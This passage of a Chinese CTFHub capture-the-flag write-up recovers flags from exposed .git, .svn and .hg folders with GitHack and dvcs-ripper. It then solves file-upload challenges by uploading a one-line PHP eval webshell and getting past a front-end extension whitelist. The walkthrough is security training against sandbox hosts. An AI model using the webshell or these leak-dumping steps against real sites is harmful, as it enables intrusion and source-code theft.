<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后进入到响应的文件夹查看git log</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080
➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>运行得到的结果如下</p>
<pre class="line-numbers language-bash"><code class="language-bash">commit b5aa9e47f5f2a2b02e23da913c5137976e36a716 <span class="token punctuation">(</span>HEAD -<span class="token operator">></span> master<span class="token punctuation">)</span>
Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>
Date:   Sun Mar 15 12:54:22 2020 +0000

    remove flag

commit 90f6b210fccb96c831fb0149bd777d02f2fdc5b9
Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>
Date:   Sun Mar 15 12:54:22 2020 +0000

    add flag

commit ba69d13b39c28abea7f0f7865d83d8cb6aa83b10
Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>
Date:   Sun Mar 15 12:54:22 2020 +0000

    init
<span class="token punctuation">(</span>END<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当前所处的版本为 <code>remove flag</code>，flag 在 <code>add flag</code>，我们就要切换版本</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> reset --hard 90f6
HEAD is now at 90f6b21 add flag
➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ ll
total 0
-rwxrwxrwx 1 kali kali  49 Mar 15 21:05 298682056511664.txt
-rwxrwxrwx 1 kali kali 494 Mar 15 21:05 50x.html
-rwxrwxrwx 1 kali kali 143 Mar 15 21:05 index.html
➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 298682056511664.txt
ctfhub<span class="token punctuation">{</span>f0aa23ed987f7f88905579799a5f7da12f6cc491<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="4-2、Stash"><a href="#4-2、Stash" class="headerlink" title="4.2、Stash"></a>4.2、Stash</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/

  ____ _ _   _   _            _
 / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __
<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>
 \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span>
 A <span class="token string">'.git'</span> folder disclosure exploit.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Clone
Cloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.
fatal: repository <span class="token string">'http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/'</span> not found
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/67/6ee2ab05e4e9190d1eb94e035ad00b23e6db3d
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/a3/b071375bbc6d7315c553d28efc9ddd16c79cbe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/8a/3f858443df92e83814ad7d6340c786c1dbafaf
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/0d/3c5e077dbbc36f7fc5fe0812c5d07173595749
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/e3/58b09f4cb4e5800dd20e1aa6758bf80811001a
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/06/36184b6082890f325e44990c6805a70f1dd06b
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2d/78a2c68cc4d62aac1d07f4321a7d0385e026a6
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/e0/8222e5d2f251eb14754ed3b40d9a1ef2f639ed
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/6c/dfa192a6458d5c5611fe5eb44338b77d712bf2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080
➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> stash list
stash@<span class="token punctuation">{</span>0<span class="token punctuation">}</span>: WIP on master: a3b0713 add flag
<span class="token comment" spellcheck="true">#可以看到栈中有内容，直接弹出</span>
➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> stash pop
CONFLICT <span class="token punctuation">(</span>modify/delete<span class="token punctuation">)</span>: 2677036325324.txt deleted <span class="token keyword">in</span> Updated upstream and modified <span class="token keyword">in</span> Stashed changes. Version Stashed changes of 2677036325324.txt left <span class="token keyword">in</span> tree.
The stash entry is kept <span class="token keyword">in</span> <span class="token keyword">case</span> you need it again.
➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 2677036325324.txt
ctfhub<span class="token punctuation">{</span>69ad3cdc7bae528787ead797f0ce24c24a2613fc<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="4-3、index"><a href="#4-3、index" class="headerlink" title="4.3、index"></a>4.3、index</h4><p>​        当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git

  ____ _ _   _   _            _
 / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __
<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>
 \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span>
 A <span class="token string">'.git'</span> folder disclosure exploit.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Clone
Cloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.
fatal: repository <span class="token string">'http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/'</span> not found
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/28/24e1bbf84973508284fdb7e401b068d36ee5e9
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/f4/a95a1573c72e0ac3be354b13e7f7707d730384
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/be/0651e066fd7424d5469d34872219d0750469f9
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/26/3f2708ef410c0e91c4bd6985ecaedd2a4a04c7
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看一下就得到flag了</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080
➜  challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ ll
total 0
-rwxrwxrwx 1 kali kali  49 Mar 15 20:50 213531131228420.txt
-rwxrwxrwx 1 kali kali 494 Mar 15 20:50 50x.html
-rwxrwxrwx 1 kali kali 143 Mar 15 20:50 index.html
➜  challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 213531131228420.txt
ctfhub<span class="token punctuation">{</span>8e1d7681a1a66c8b74d5a1b20b3a6b0d920589e2<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="5、SVN"><a href="#5、SVN" class="headerlink" title="5、SVN"></a>5、SVN</h3><p>​        当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  dvcs-ripper-master <span class="token function">sudo</span> perl rip-svn.pl -u http://challenge-c523a500b40f2829.sandbox.ctfhub.com:10080/.svn/
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Found new SVN client storage format<span class="token operator">!</span>
REP INFO <span class="token operator">=</span><span class="token operator">></span> 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Trying to revert the tree, <span class="token keyword">if</span> you get error, upgrade your SVN client<span class="token operator">!</span>
Reverted <span class="token string">'index.html'</span>
➜  dvcs-ripper-master ll -a
total 80K
drwxrwxrwx 1 kali kali 4.0K Mar 15 21:24 <span class="token keyword">.</span>
drwxrwxrwx 1 kali kali 4.0K Mar 15 21:21 <span class="token punctuation">..</span>
-rwxrwxrwx 1 kali kali  149 Oct 22  2018 .gitignore
-rwxrwxrwx 1 kali kali 3.8K Oct 22  2018 hg-decode.pl
-rwxrwxrwx 1 kali kali  221 Mar 15 21:24 index.html
-rwxrwxrwx 1 kali kali  18K Oct 22  2018 LICENSE
-rwxrwxrwx 1 kali kali 5.5K Oct 22  2018 README.md
-rwxrwxrwx 1 kali kali 6.3K Oct 22  2018 rip-bzr.pl
-rwxrwxrwx 1 kali kali 4.7K Oct 22  2018 rip-cvs.pl
-rwxrwxrwx 1 kali kali  15K Oct 22  2018 rip-git.pl
-rwxrwxrwx 1 kali kali 6.0K Oct 22  2018 rip-hg.pl
-rwxrwxrwx 1 kali kali 6.1K Oct 22  2018 rip-svn.pl
drwxrwxrwx 1 kali kali 4.0K Mar 15 21:24 .svn
<span class="token comment" spellcheck="true">#发现生成了.svn这个目录，可以继续查看</span>
➜  dvcs-ripper-master tree .svn
.svn
├── entries
├── <span class="token function">format</span>
├── pristine
│   ├── bf
│   │   └── bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base
│   └── c4
│       └── c4b3e18fe09fc3a63ec12c483c84012537bb5f2c.svn-base
├── text-base
├── tmp
├── wc.db
└── wc.db-journal
➜  pristine <span class="token function">cat</span> c4/c4b3e18fe09fc3a63ec12c483c84012537bb5f2c.svn-base bf/bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base
ctfhub<span class="token punctuation">{</span>1be4627619f2fd32babf97c15c0c93b1ce342934<span class="token punctuation">}</span>
<span class="token operator">&lt;</span>html<span class="token operator">></span>

<span class="token operator">&lt;</span>head<span class="token operator">></span>
    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span> /<span class="token operator">></span>
    <span class="token operator">&lt;</span>title<span class="token operator">></span>CTFHub 信息泄露 SVN<span class="token operator">&lt;</span>/title<span class="token operator">></span>
<span class="token operator">&lt;</span>/head<span class="token operator">></span>

<span class="token operator">&lt;</span>body<span class="token operator">></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>信息泄露 - Subversion<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
    <span class="token operator">&lt;</span>br/<span class="token operator">></span>
    <span class="token operator">&lt;</span>p<span class="token operator">></span>Flag 在服务端旧版本的源代码中<span class="token operator">&lt;</span>/p<span class="token operator">></span>
<span class="token operator">&lt;</span>/body<span class="token operator">></span>

<span class="token operator">&lt;</span>/html<span class="token operator">></span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到了flag</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1be4627619f2fd32babf97c15c0c93b1ce342934<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="6、HG泄露"><a href="#6、HG泄露" class="headerlink" title="6、HG泄露"></a>6、HG泄露</h3><p>​        当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
<pre class="line-numbers language-bash"><code class="language-bash">  dvcs-ripper-master <span class="token function">sudo</span> perl rip-hg.pl -u http://challenge-cf7c8f19e3e86d74.sandbox.ctfhub.com:10080/.hg/
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Getting correct 404 responses
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Finished <span class="token punctuation">(</span>2 of 12<span class="token punctuation">)</span>
➜  dvcs-ripper-master <span class="token function">cd</span> .hg
➜  .hg tree
<span class="token keyword">.</span>
├── 00changelog.i
├── dirstate
├── last-message.txt
├── requires
├── store
│   ├── 00changelog.i
│   ├── 00manifest.i
│   ├── data
│   │   ├── 50x.html.i
│   │   └── index.html.i
│   ├── fncache
│   └── undo
├── undo.branch
├── undo.desc
├── undo.dirstate
└── wcache
    ├── checklink -<span class="token operator">></span> checklink-target
    └── checklink-target

3 directories, 15 files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">➜  .hg <span class="token function">cat</span> store/*
or��������� <span class="token punctuation">(</span>
               ���$<span class="token operator">!</span>�<span class="token operator">|</span>���M�x�-�A
kx�ɻtv����e�����<span class="token operator">!</span>β�^:<span class="token string">"(��_I,�B֋R�F�-kD�H;���;��J�9��T�����uH{'�!�hM�TRY�5���>��
1@�>_�/X�LDDa��^�A�PS��|���=�ȠXrI   �9)5����x!(�!��}��|���۰����Iz}�&lt;I������u�����nw�>���n
                                                                                                   ������"</span> Yf��������H�tw�����m'�Ȉ�*x�-�1�@�<span class="token operator">></span>�@<span class="token punctuation">)</span>-<span class="token operator">&lt;</span>�M������x�1<span class="token operator">&lt;</span>�v�Ǣ�2K<span class="token punctuation">)</span><span class="token punctuation">{</span>�Z3�s�<span class="token operator">&amp;</span>ӱfA����?6<span class="token punctuation">[</span>�B�
                                                                               6�Ta�<span class="token punctuation">(</span>��1$�Ü*YI�����<span class="token punctuation">;</span><span class="token punctuation">]</span>xf$�<span class="token operator">|</span>��z����uX�T22<span class="token operator">=</span>flag_1027926131.txt52ec47b45f42236237d78a46be594c753f4754c7
cat: store/data: Is a directory
data/index.html.i
data/50x.html.i
data/flag_1027926131.txt.i
data/flag_1027926131.txt.i0
00manifest.i153
00changelog.i175<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后使用命令</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  .hg curl http://challenge-cf7c8f19e3e86d74.sandbox.ctfhub.com:10080/flag_1027926131.txt
ctfhub<span class="token punctuation">{</span>7858c2fb14bc35af6870bfecaa93fce0a4e7269b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h2><h3 id="1、无验证"><a href="#1、无验证" class="headerlink" title="1、无验证"></a>1、无验证</h3><img src="https://s1.ax1x.com/2020/04/08/GfaZsH.png">

<p>先编写一句话木马</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'vale'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>因为这个题目时没有验证，所以可以直接上传</p>
<img src="https://s1.ax1x.com/2020/04/08/GfaFJK.png">

<p>然后得到了路径，这里使用蚁剑连接</p>
<img src="https://s1.ax1x.com/2020/04/08/GfaAzD.png">

<p>点击添加之后就能看到可以连接了</p>
<img src="https://s1.ax1x.com/2020/04/08/Gfaii6.png">

<p>然后向上级目录查找</p>
<img src="https://s1.ax1x.com/2020/04/08/GfaCIx.png">

<p>得到flag文件，打开即可获取flag</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>85c40de2fe2b5475d81dd2a491600ae533a3602c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="2、前端验证"><a href="#2、前端验证" class="headerlink" title="2、前端验证"></a>2、前端验证</h3><p>​    这里题目提示是有前端验证的</p>
<img src="https://s1.ax1x.com/2020/04/08/GfaeLd.png">

<p>然后我们先提交一个1.php，看看响应是什么</p>
<img src="https://s1.ax1x.com/2020/04/08/GfaneA.png">

<p>这里直接得到了一个允许上传的提示，查看一下源代码</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"> <span class="token keyword">var</span> whitelist<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token string">".jpg"</span><span class="token punctuation">,</span><span class="token string">".png"</span><span class="token punctuation">,</span><span class="token string">".gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里看到只允许上传三种图片，尝试通过修改文件名后缀来进行绕过</p>
<img src="https://s1.ax1x.com/2020/04/08/GfaKot.png">

<p>这里上传了一个<code>1.php.jpg</code>发现可以上传成功，使用Burpsuite来对上传的这个文件进行修改</p>
<img src="https://s1.ax1x.com/2020/04/08/Gfa1W8.png">

<p>这里显示上传成功了，这里用蚁剑连接，得到flag</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>e3f815403d9372e9ed80556faf1205b39af449be<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
